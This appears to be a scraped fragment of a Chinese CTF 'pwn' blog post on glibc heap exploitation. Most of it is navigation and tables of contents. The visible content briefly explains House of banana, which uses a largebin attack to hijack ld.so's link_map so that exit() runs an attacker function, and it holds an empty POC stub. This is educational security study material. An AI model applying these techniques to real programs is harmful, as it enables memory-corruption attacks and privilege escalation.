href="#1-5-%E6%81%A2%E5%A4%8D%E6%BA%90%E7%A0%81-%E4%B8%8Epatchelf%E5%85%B3%E7%B3%BB%E4%B8%8D%E5%A4%A7"><span class="toc-text">[1-5] 恢复源码(与patchelf关系不大)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E8%AF%A6%E8%A7%A3-%E2%80%98%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%87%8A%E6%94%BE-chunk%E2%80%99-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">[2] 详解 ‘申请与释放 chunk’(未完成)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%94%B3%E8%AF%B7-chunk"><span class="toc-text">[2-1] 申请 chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E9%87%8A%E6%94%BE-chunk"><span class="toc-text">[2-2] 释放 chunk</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-chunk-Extend-and-Overlapping"><span class="toc-text">[3] chunk Extend and Overlapping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%88%86%E7%B1%BB"><span class="toc-text">[3-1] 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-1-%E5%90%8E%E5%90%91-Overlap"><span class="toc-text">[3-1-1] 后向 Overlap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-%E5%89%8D%E5%90%91-Overlap"><span class="toc-text">[3-1-2] 前向 Overlap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-text">[3-2] 具体利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-1-off-by-null"><span class="toc-text">[3-2-1] off-by-null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[3-2-1-1] 概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-1-2-POC"><span class="toc-text">[3-2-1-2] POC</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Use-After-Free"><span class="toc-text">[4] Use After Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[4-1] 概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Double-Free"><span class="toc-text">[5] Double Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[5-1] 概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Unlink"><span class="toc-text">[6] Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">[6-1] 利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-%E5%8E%9F%E7%90%86"><span class="toc-text">[6-2] 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-1-%E8%A7%A6%E5%8F%91-unlink"><span class="toc-text">[6-2-1] 触发 unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-2-%E5%8F%A4%E6%97%A9%E7%89%88%E6%9C%AC"><span class="toc-text">[6-2-2] 古早版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-3-%E5%8A%A0%E5%85%A5-check-%E4%BB%A5%E5%90%8E"><span class="toc-text">[6-2-3] 加入 check 以后</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Series-of-Bin"><span class="toc-text">[7] Series of Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-Tcachebin"><span class="toc-text">[7-1] Tcachebin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[7-1-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-2-Leak"><span class="toc-text">[7-1-2] Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-3-Write"><span class="toc-text">[7-1-3] Write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-3-1-UAF"><span class="toc-text">[7-1-3-1] UAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-3-2-Stash-Double-Free"><span class="toc-text">[7-1-3-2] Stash Double Free</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-Fastbin"><span class="toc-text">[7-2] Fastbin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[7-2-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-2-Leak"><span class="toc-text">[7-2-2] Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-3-Write"><span class="toc-text">[7-2-3] Write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-3-1-Double-Free"><span class="toc-text">[7-2-3-1] Double Free</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-3-Unsortedbin"><span class="toc-text">[7-3] Unsortedbin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-1-leak"><span class="toc-text">[7-3-1] leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-3-2-write"><span class="toc-text">[7-3-2] write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-3-2-1-Direct"><span class="toc-text">[7-3-2-1] Direct</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-4-Largebin-Attack"><span class="toc-text">[7-4] Largebin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[7-4-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-2-leak"><span class="toc-text">[7-4-2] leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4-3-write"><span class="toc-text">[7-4-3] write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-3-1-%E5%AF%B9-libc-%E6%9C%89%E8%A6%81%E6%B1%82"><span class="toc-text">[7-4-3-1] 对 libc 有要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-4-3-2-%E5%AF%B9-libc-%E6%B2%A1%E8%A6%81%E6%B1%82"><span class="toc-text">[7-4-3-2] 对 libc 没要求</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-Series-of-House"><span class="toc-text">[8] Series of House</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-House-of-Orange"><span class="toc-text">[8-1] House of Orange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[8-1-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-2-%E4%BC%AA%E9%80%A0chunk%E9%9C%80%E6%B1%82"><span class="toc-text">[8-1-2] 伪造chunk需求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-House-of-Force-HOF"><span class="toc-text">[8-2] House of Force (HOF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[8-2-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-2-%E5%85%B7%E4%BD%93%E5%8E%9F%E7%90%86"><span class="toc-text">[8-2-2] 具体原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-House-of-botcake"><span class="toc-text">[8-3] House of botcake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[8-3-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-2-POC"><span class="toc-text">[8-3-2] POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-3-%E4%B8%80%E4%BA%9B%E7%96%91%E9%97%AE"><span class="toc-text">[8-3-3] 一些疑问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-4-House-of-banana"><span class="toc-text">[8-4] House of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-1-%E6%A6%82%E8%BF%B0"><span class="toc-text">[8-4-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-2-POC"><span class="toc-text">[8-4-2] POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-3-%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0-fake-chunk"><span class="toc-text">[8-4-3] 如何构造 fake_chunk?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-5-House-of-pig"><span class="toc-text">[8-5] House of pig</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/55764.html" title="paper - Moneta Ex-Vivo GPU Driver Fuzzing by Recalling In-Vivo Execution States"><img src="/img/cover9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="paper - Moneta Ex-Vivo GPU Driver Fuzzing by Recalling In-Vivo Execution States"/></a><div class="content"><a class="title" href="/posts/55764.html" title="paper - Moneta Ex-Vivo GPU Driver Fuzzing by Recalling In-Vivo Execution States">paper - Moneta Ex-Vivo GPU Driver Fuzzing by Recalling In-Vivo Execution States</a><time datetime="2025-04-08T02:49:00.000Z" title="发表于 2025-04-08 10:04:00">2025-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/65231.html" title="kernel - syzkaller"><img src="/img/cover1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kernel - syzkaller"/></a><div class="content"><a class="title" href="/posts/65231.html" title="kernel - syzkaller">kernel - syzkaller</a><time datetime="2025-03-14T03:58:00.000Z" title="发表于 2025-03-14 11:03:00">2025-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/25823.html" title="kernel - 浅析 kernel drivers 与简单实操"><img src="/img/cover4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kernel - 浅析 kernel drivers 与简单实操"/></a><div class="content"><a class="title" href="/posts/25823.html" title="kernel - 浅析 kernel drivers 与简单实操">kernel - 浅析 kernel drivers 与简单实操</a><time datetime="2025-02-21T05:06:00.000Z" title="发表于 2025-02-21 13:02:00">2025-02-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/34368.html" title="fuzz - 浅析原理与 AFLpp 使用"><img src="/img/cover5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fuzz - 浅析原理与 AFLpp 使用"/></a><div class="content"><a class="title" href="/posts/34368.html" title="fuzz - 浅析原理与 AFLpp 使用">fuzz - 浅析原理与 AFLpp 使用</a><time datetime="2025-02-14T05:46:00.000Z" title="发表于 2025-02-14 13:02:00">2025-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/18184.html" title="blockchain - openzeppelin 源码阅读"><img src="/img/cover6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="blockchain - openzeppelin 源码阅读"/></a><div class="content"><a class="title" href="/posts/18184.html" title="blockchain - openzeppelin 源码阅读">blockchain - openzeppelin 源码阅读</a><time datetime="2025-02-05T10:15:00.000Z" title="发表于 2025-02-05 18:02:00">2025-02-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover9.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2025 By HeyGap</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">中</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><script data-pjax src="/self/btf.js"></script><script data-pjax src="/self/ch_en.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+<p>目前猜测是: 直接把 chunk8 放进 tcachebin 会导致原本存在 chunk8 fd/bk
+处的 &amp;main_arena+88 被替换，导致 malloc 错误</p>
+<h2 id="house-of-banana">[8-4] House of banana</h2>
+<p>具体细节可以看这篇<a
+target="_blank" rel="noopener" href="https://www.secpulse.com/archives/180765.html">文章</a></p>
+<h3 id="概述-9">[8-4-1] 概述</h3>
+<p>当程序显式调用<code>exit()</code>函数时，程序会通过<code>exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ()</code>这条调用链调用
+<code>array[i]()</code>。</p>
+<p>而 <code>array[i]()</code> 是通过
+<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>
+定位的</p>
+<p>通过 largebin
+attack，我们可以篡改<code>_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</code>指针，将其值修改为我们可以控制的堆地址，</p>
+<p>而通过在堆上伪造一个 link_map 结构体，我们可以欺骗程序，使其执行
+<code>array[i]()</code> 时执行在结构体里放入的提权函数，进而提权</p>
+<h3 id="poc-2">[8-4-2] POC</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># largebin attack 修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 fake chunk</span></span><br></pre></td></tr></table></figure>
+<h3 id="如何构造-fake_chunk">[8-4-3] 如何构造 fake_chunk?</h3>
+<p>见 <a
+href="https://heygap.github.io/2024/02/15/Pwn%20-%20IO_File%20and%20ld.so%20exploit%20summary/#more">Pwn
+- IO_File and ld.so exploit summary</a></p>
+<h2 id="house-of-pig">[8-5] House of pig</h2>
+<p>https://bbs.kanxue.com/thread-268245.htm#msg_header_h3_2</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://heygap.github.io/en">HeyGap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://heygap.github.io/en/posts/56319.html">http://heygap.github.io/en/posts/56319.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/en/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/en/tags/Heap/">Heap</a></div><div class="post-share"><div class="social-share" data-image="/en/img/cover5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/en/posts/20963.html" title="Math Knowledge Summary"><img class="cover" src="/en/img/cover4.jpg" onerror="onerror=null;src='/en/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Math Knowledge Summary</div></div><div class="info-2"><div class="info-item-1"> 总结一下计算机中的数学相关内容，便于后续调用   [0] 目录  数学算法  [模乘]  [1-1-1 蒙哥马利算法]   密码学  Stream Cipher  1-1 RC4  Block Cipher  2-1 tea/xtea/xxtea    [1] MATH [1-1] 模乘 [1-1-1] 蒙哥马利算法 蒙哥马利算法能够提高类似模幂运算的速度而实现的，主要是因为蒙哥马利算法巧妙地避免了大量模运算（除法），极大地降低了运算时间，下面介绍如何减少x*y mod N的模运算数目。 首先，蒙哥马利算法引入了REDC函数，该函数以大数T，模数N，模数N的逆元的负数N'和整数R（如果N为素数，R一般选取\(2^{n\_bit}\)，这样就可以在整除前提下用移位运算代替除法运算，也就是将下面代码第三行的整除运算换成移位运算）作为输入，在不使用模运算的情况下输出\(TR^{-1}...</div></div></div></a><a class="pagination-related" href="/en/posts/47197.html" title="Pwn - Shellcode Summary"><img class="cover" src="/en/img/cover3.jpg" onerror="onerror=null;src='/en/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Pwn - Shellcode Summary</div></div><div class="info-2"><div class="info-item-1"> Shellcode 也是十分核心的技术🤔   Manual linux 系统调用号表 manual: pwntools.shellcraft [0] 目录  编写 shellcode  shellcode 板子 现有工具 板子  shellcode restrictions &amp; bypass (限制与绕过)  Length restrictions (长度约束) seccomp 禁用 alphanumeric shellcode (字母+数字构成)  例题 参考资料  [1] 编写 shellcode [1-1] shellcode 板子  exploit-db Shellcodes database for study cases(已停止更新)  这个虽然停更了但是挺好用的，很适合找一些 length restrictions 的 shellcode   [1-2] 现有工具 [1-2-1] Pwntools [1-2-1-1] shellcraft  Manual 速成...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/en/posts/61241.html" title="Pwn - Format String Summary"><img class="cover" src="/en/img/cover8.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-21</div><div class="info-item-2">Pwn - Format String Summary</div></div><div class="info-2"><div class="info-item-1"> 总结一下格式化字符串漏洞，便于后续调用   原理 &amp; 工具 原理  本质是利用 printf(string) 任意地址读写   记录一下常用的格式  123456fmt    :        标准作用       ||           常用方式——————————————————————————————————————————————————————————————%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary%s     :   输出地址指向的内容   ||     (读) 泄露libc_base%hhn   :   修改地址指向的byte   |        (写) 任意地址写%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写 工具: Pwntools - fmtstr_payload Pwntools - class fmtstr  源码见上述链接或文章末尾的 Appendix  fmtstr是一个类，我们只需要用其中的...</div></div></div></a><a class="pagination-related" href="/en/posts/5670.html" title="Pwn - Architecture other than LinuxC"><img class="cover" src="/en/img/cover2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-09</div><div class="info-item-2">Pwn - Architecture other than LinuxC</div></div><div class="info-2"><div class="info-item-1"> 总结一下异架构的相关内容，便于后续调用   目录  Different Language  python  Different Architecture  ARM   [1] Different Language [1-1] python [1-1-1] python 链接 动态链接库 12345# 在 main.py 中添加:sys.path.append(&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;)# app.cpython-37m-x86_64-linux-gnu.so 中的 37m 指的是 python3.7import packagename [1-1-2] 用 pwntools 调试 1io = process([&#x27;python&#x27;, &#x27;main.py&#x27;]) [2] Different Architecture [2-1]...</div></div></div></a><a class="pagination-related" href="/en/posts/46771.html" title="Pwn - IO_File and ld.so exploit summary"><img class="cover" src="/en/img/cover1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-15</div><div class="info-item-2">Pwn - IO_File and ld.so exploit summary</div></div><div class="info-2"><div class="info-item-1"> IO_File 与 ld.so 利用总结   [1] IO_File 好文 PIG-007 glibc2.37 IO [2] ld.so [2-1] _rtld_global._dl_ns._ns_loaded [2-1-1] 原理 程序在调用exit()退出时，会调用(待调试)，而我们可以通过修改 _rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next [2-1-2] 找偏移量  恢复调试符号请看Pwn - Heap Exploit Summary 的 patchelf 部分  恢复调试符号以后，在 pwndbg 中输入 1234567891011# 找 &amp;(_rtld_global._dl_ns._ns_loaded.l_next-&gt;l_next-&gt;l_next) # 与 &amp;(_rtld_global) 之间的偏移量pwndbg&gt; distance &amp;_rtld_global...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/en/img/avatar.jpg" onerror="this.onerror=null;this.src='/en/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">HeyGap</div><div class="author-info-description">An undergraduate student of Cybersecurity at SDU.</div><div class="site-data"><a href="/en/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/en/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/en/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeyGap"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/HeyGap" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2310769056@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客，主要用来记录一些学习笔记和生活感悟。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">[0] 目录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#patchelf%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">[1] Patchelf的使用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4libc"><span class="toc-text">[1-1] 确认libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-%E5%8C%85%E7%9A%84%E4%B8%8B%E8%BD%BD"><span class="toc-text">[1-2] libc 包的下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#patch-elf%E6%96%87%E4%BB%B6"><span class="toc-text">[1-3] patch elf文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D-debug-symbol"><span class="toc-text">[1-4] 恢复 debug symbol</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#patchelf-list-%E4%B8%AD%E6%9C%89%E7%9B%B8%E5%85%B3%E5%8C%85"><span class="toc-text">[1-4-1] patchelf list 中有相关包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#list-%E4%B8%AD%E6%B2%A1%E6%9C%89%E7%9B%B8%E5%85%B3%E5%8C%85"><span class="toc-text">[1-4-2] list 中没有相关包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E6%BA%90%E7%A0%81%E4%B8%8Epatchelf%E5%85%B3%E7%B3%BB%E4%B8%8D%E5%A4%A7"><span class="toc-text">[1-5]
+恢复源码(与patchelf关系不大)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3-%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%87%8A%E6%94%BE-chunk%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-text">[2] 详解 &#39;申请与释放
+chunk&#39;(未完成)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7-chunk"><span class="toc-text">[2-1] 申请 chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8A%E6%94%BE-chunk"><span class="toc-text">[2-2] 释放 chunk</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#chunk-extend-and-overlapping"><span class="toc-text">[3] chunk Extend and
+Overlapping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-text">[3-1] 分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%90%91-overlap"><span class="toc-text">[3-1-1] 后向 Overlap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%90%91-overlap"><span class="toc-text">[3-1-2] 前向 Overlap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-text">[3-2] 具体利用手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-text">[3-2-1] off-by-null</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">[3-2-1-1] 概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#poc"><span class="toc-text">[3-2-1-2] POC</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#use-after-free"><span class="toc-text">[4] Use After Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-text">[4-1] 概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#double-free"><span class="toc-text">[5] Double Free</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-2"><span class="toc-text">[5-1] 概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unlink"><span class="toc-text">[6] Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">[6-1] 利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">[6-2] 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-unlink"><span class="toc-text">[6-2-1] 触发 unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E6%97%A9%E7%89%88%E6%9C%AC"><span class="toc-text">[6-2-2] 古早版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5-check-%E4%BB%A5%E5%90%8E"><span class="toc-text">[6-2-3] 加入 check 以后</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#series-of-bin"><span class="toc-text">[7] Series of Bin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tcachebin"><span class="toc-text">[7-1] Tcachebin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-3"><span class="toc-text">[7-1-1] 概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#leak"><span class="toc-text">[7-1-2] Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write"><span class="toc-text">[7-1-3] Write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#uaf"><span class="toc-text">[7-1-3-1] UAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stash-double-free"><span class="toc-text">[7-1-3-2] Stash Double Free</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin"><span class="toc-text">[7-2] Fastbin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-4"><span 